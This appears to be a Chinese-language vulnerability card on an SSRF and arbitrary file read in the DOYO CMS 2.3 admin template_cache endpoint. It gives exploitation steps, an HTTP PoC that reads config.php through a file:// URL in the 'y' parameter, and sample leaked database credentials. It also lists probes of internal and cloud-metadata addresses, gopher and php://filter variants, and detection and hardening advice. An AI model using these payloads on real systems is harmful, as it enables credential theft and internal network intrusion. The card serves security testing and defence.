---
id: web-generic-ssrf-php-curl-get-file-scheme-config-read
title: 后台模板缓存接口 curl_get 未限制协议：file:// 读取 config.php 与内网 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: curl-get-unrestricted-scheme
aliases:
- DOYO CMS SSRF
- template_cache SSRF
- curl_get file://
- 后台任意文件读取
- y 参数 SSRF
tags:
- php
- ssrf
- curl
- file-scheme
- arbitrary-file-read
- admin
- cms
cve: []
severity: high
confidence: high
status: verified
affected_versions: DOYO CMS 2.3（原文 config version=2.3、update=20130118）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:02:58+08:00'
  notes: 已对照原文与图18-19核对：a_sys.php template_cache 在 y 非空且 curl_init 存在时 echo curl_get($y)，无 curl 回退 file_get_contents($y) 并原样 echo；Functions.php curl_get 仅设置超时/RETURNTRANSFER/POST 字段，未设置 CURLOPT_PROTOCOLS 或主机白名单；图19 POST y=file:///D:\phpstudy_pro\WWW\www.d13.com\config.php 原样回显 config 数组（host/login/password/secret_key 等），任意文件读取成立；内网 http/gopher 原文未实测，卡内以变体表述。版本 DOYO CMS 2.3 原文 config 标注。PoC 未在本机复现。
---

## 一句话结论

CMS 后台的 `a_sys.template_cache` 接口把用户传入的 `y` 参数直接交给 `curl_get()`，而 `curl_get` 只设置 URL、超时和 POST 字段，没有限制协议或目标主机；登录后台后传 `y=file:///绝对路径/config.php` 即可让服务端读取并回显本机配置文件，也可访问内网 HTTP 服务形成 SSRF。

## 原理

- 入口 `source/admin/a_sys.php` 的 `template_cache()`：当 `y` 非空且 `curl_init` 存在时执行 `echo curl_get($y)`；否则回退到 `file_get_contents($y)` 并 `echo` 结果。
- `curl_get($url)` 的实现只做：`curl_init`、设置超时/`RETURNTRANSFER`、按 `?` 分割 URL（有 query 则设为 POST 并把 query 作为 POSTFIELDS）、`curl_setopt(CURLOPT_SSL_VERIFYPEER, 0)`、`curl_exec`、返回内容。没有 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` 白名单，也没有 host/IP 校验。
- libcurl 默认支持 `file://` 协议（取决于编译选项，常见发行版默认包含），因此 `file:///D:\path\config.php` 或 `file:///var/www/config.php` 会被当作本地文件读取并原样回显。
- 即使 curl 不可用，`file_get_contents` 也支持 `file://` 与 `http://`，回退逻辑同样可读本地文件/访问内网。
- `config.php` 含数据库 host/账号/密码、站内 `secret_key` 等；读取后可进一步连数据库、伪造会话或横向。
- 该接口位于后台，正常需要管理员会话；因此这是“后台功能滥用 + 服务端请求伪造”，常与弱口令/后台越权组合。

## 触发条件

- 目标为 DOYO CMS（或包含相同 `template_cache`/`curl_get` 代码的衍生系统）。
- 攻击者拥有后台管理员会话（弱口令、默认口令、越权或其它入口）。
- PHP 启用 curl 扩展（或 allow_url_fopen 允许 file/http）。
- 攻击者知道目标文件路径（Windows 常见 `D:\phpstudy_pro\WWW\...`，Linux 常见 `/var/www/html/...`、`/etc/passwd`）。

## 利用步骤

1. 登录后台，进入系统设置/模板缓存功能，抓取 `admin.php?c=a_sys&a=template_cache` 请求。
2. 将 `y` 改为本地文件 URL：`y=file:///D:\phpstudy_pro\WWW\www.d13.com\config.php`（Windows）或 `y=file:///var/www/html/config.php`（Linux）。
3. 发送请求，响应体直接返回文件内容；读取数据库账号、密码、`secret_key` 等。
4. 将 `y` 改为内网地址（如 `http://127.0.0.1:8080/`、`http://169.254.169.254/`）探测内网服务/云元数据。
5. 用泄露的数据库凭据连接数据库，或利用 `secret_key` 伪造应用数据；授权测试中仅做只读验证。
6. 若 `file://` 被禁用，尝试 `php://filter/convert.base64-encode/resource=...`（取决于回退路径）或其它内网 URL。

## PoC

```http
POST /admin.php?c=a_sys&a=template_cache HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin-session>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

y=file:///D:\phpstudy_pro\WWW\www.d13.com\config.php
```

响应会包含：

```text
array('host' => '127.0.0.1', 'port' => 3306, 'database' => 'www_d13_com',
'login' => 'root', 'password' => 'root', 'prefix' => 'dy_', ...)
```

内网探测：

```http
y=http://127.0.0.1:8080/
```

## 变体与关联

- 协议变体：`file://` 读本地文件、`http/https` 探测内网/云元数据、`gopher/dict` 打内网服务（取决于 libcurl 编译协议）。
- 回退变体：无 curl 时 `file_get_contents` 同样支持 `file://`/`http://`，且可用 `php://filter` 读源码。
- 功能变体：其它“抓取远程 URL/模板缓存/图片下载/Webhook 测试”后台功能，若直接 `curl_exec`/`file_get_contents` 用户 URL，均可复用。
- 关联卡片：[[web-generic-ssrf-curl-gopher-loopback-admin]]、[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]、[[web-generic-ssrf-ip-notation-blacklist-bypass]]。
- 关联：后台弱口令/越权是常见前置条件。

## 检测与防御

- 检测：`template_cache` 请求的 `y` 含 `file://`、`php://`、内网 IP、`169.254.169.254`、`127.0.0.1`；响应体返回配置/系统文件内容。
- 检测：Web 进程向非业务地址发起 HTTP 请求；`curl`/`file_get_contents` 访问本地敏感路径；后台接口响应异常大或包含配置字段。
- 防御：对 `y` 使用严格 URL 白名单（仅允许指定域名/协议 https/http），禁止 `file://`、`php://`、`gopher://` 等；解析后校验 host/IP，禁止内网与元数据地址。
- 防御：设置 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS`，关闭 `allow_url_fopen`；不要回显远程/本地内容给客户端。
- 加固：后台强口令与多因素认证；该功能仅管理员可用并做审计；最小化后台暴露面。
- 响应：轮换数据库密码与 `secret_key`、排查内网访问日志与配置读取痕迹、修复后回归 SSRF 测试。
